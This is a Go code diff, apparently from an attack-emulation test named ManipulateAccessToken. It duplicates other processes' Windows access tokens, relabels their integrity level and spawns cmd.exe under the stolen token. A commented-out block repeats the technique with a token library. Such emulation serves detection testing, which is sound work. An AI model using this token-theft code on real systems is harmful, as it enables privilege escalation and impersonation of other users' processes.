@@ -80,75 +80,68 @@ func main() {
 		}
 	}
 	for i := 0; i < len(pidToDup); i++ {
-		handle, err := windows.OpenProcess(uint32(windows.PROCESS_QUERY_LIMITED_INFORMATION), false, windows.GetCurrentProcessId())
+		handle1, err := windows.OpenProcess(uint32(windows.PROCESS_QUERY_LIMITED_INFORMATION), false, uint32(pidToDup[i]))
 		if err != nil {
 			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-		} else {
-			var tokCurrProc windows.Token
+		}
 
-			err = windows.OpenProcessToken(handle, uint32(windows.TOKEN_ADJUST_PRIVILEGES), &tokCurrProc)
-			if err != nil {
-				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-			}
+		var tokTarg, dupTokHand windows.Token
+		err = windows.OpenProcessToken(handle1, uint32(windows.TOKEN_DUPLICATE), &tokTarg)
+		if err != nil {
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		}
 
-			var luid windows.LUID
+		err = windows.DuplicateTokenEx(tokTarg, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_QUERY|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, windows.SecurityImpersonation, windows.TokenPrimary, &dupTokHand)
+		if err != nil {
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		}
 
-			err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
-			if err != nil {
-				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-			}
+		var tml TOKEN_MANDATORY_LABEL
+		var sid = new(windows.SID)
+		windows.ConvertStringSidToSid(windows.StringToUTF16Ptr("S-1-16-8192"), &sid)
+		tml.Label.Sid = sid
+		tml.Label.Attributes = windows.SE_GROUP_INTEGRITY
 
-			tp := new(windows.Tokenprivileges)
-			tp.PrivilegeCount = 1
-			tp.Privileges[0].Luid = luid
-			tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
-
-			err = windows.AdjustTokenPrivileges(tokCurrProc, false, tp, uint32(unsafe.Sizeof(tp)), nil, nil)
-			if err != nil {
-				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-			}
-
-			handle1, err := windows.OpenProcess(uint32(windows.PROCESS_QUERY_LIMITED_INFORMATION), false, uint32(pidToDup[i]))
-			if err != nil {
-				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-			}
-
-			var tokTarg, dupTokHand windows.Token
-			err = windows.OpenProcessToken(handle1, uint32(windows.TOKEN_DUPLICATE), &tokTarg)
-			if err != nil {
-				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-			}
-
-			err = windows.DuplicateTokenEx(tokTarg, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_QUERY|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, windows.SecurityImpersonation, windows.TokenPrimary, &dupTokHand)
-			if err != nil {
-				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-			}
-
-			var tml TOKEN_MANDATORY_LABEL
-			var sid = new(windows.SID)
-			windows.ConvertStringSidToSid(windows.StringToUTF16Ptr("S-1-16-8192"), &sid)
-			tml.Label.Sid = sid
-			tml.Label.Attributes = windows.SE_GROUP_INTEGRITY
-
-			_, _, err = setTok.Call(uintptr(dupTokHand), windows.TokenIntegrityLevel, uintptr(unsafe.Pointer(&tml)), uintptr(unsafe.Sizeof(tml)))
-			if err != nil {
-				if err.Error() != "The operation completed successfully." {
-					helpers.WriteLog(nameOfLogFile, err.Error()+" from pid "+strconv.Itoa(int(pidToDup[i]))+" ", 1)
-					continue
-				}
-			}
-
-			var startInfo windows.StartupInfo
-			var procInfo windows.ProcessInformation
-
-			_, _, err = newProc.Call(uintptr(dupTokHand), 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("C:\\Windows\\System32\\cmd.exe"))), 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&startInfo)), uintptr(unsafe.Pointer(&procInfo)))
-			if err != nil {
+		_, _, err = setTok.Call(uintptr(dupTokHand), windows.TokenIntegrityLevel, uintptr(unsafe.Pointer(&tml)), uintptr(unsafe.Sizeof(tml)))
+		if err != nil {
+			if err.Error() != "The operation completed successfully." {
 				helpers.WriteLog(nameOfLogFile, err.Error()+" from pid "+strconv.Itoa(int(pidToDup[i]))+" ", 1)
-			} else {
-				os.Exit(0)
+				continue
 			}
+		}
+
+		var startInfo windows.StartupInfo
+		var procInfo windows.ProcessInformation
+
+		_, _, err = newProc.Call(uintptr(dupTokHand), 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("cmd.exe"))), 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&startInfo)), uintptr(unsafe.Pointer(&procInfo)))
+		if err != nil {
+			helpers.WriteLog(nameOfLogFile, err.Error()+" from pid "+strconv.Itoa(int(pidToDup[i]))+" ", 1)
+		} else {
+			os.Exit(0)
 		}
 	}
 	helpers.WriteLog(nameOfLogFile, "Ending Test: ManipulateAccessToken", 2)
 	os.Exit(1)
 }
+
+/*package main
+
+import (
+	"fmt"
+	"github.com/fourcorelabs/wintoken"
+	"os/exec"
+	"syscall"
+)
+
+func main() {
+	tok, err := wintoken.OpenProcessToken(6928, wintoken.TokenPrimary)
+	if err != nil {
+		fmt.Println(err.Error())
+	}
+
+	fmt.Println(tok.GetPrivileges())
+	cmd := exec.Command("cmd.exe")
+	cmd.SysProcAttr = &syscall.SysProcAttr{Token: syscall.Token(tok.Token())}
+	err = cmd.Run()
+	fmt.Println(err)
+}*/
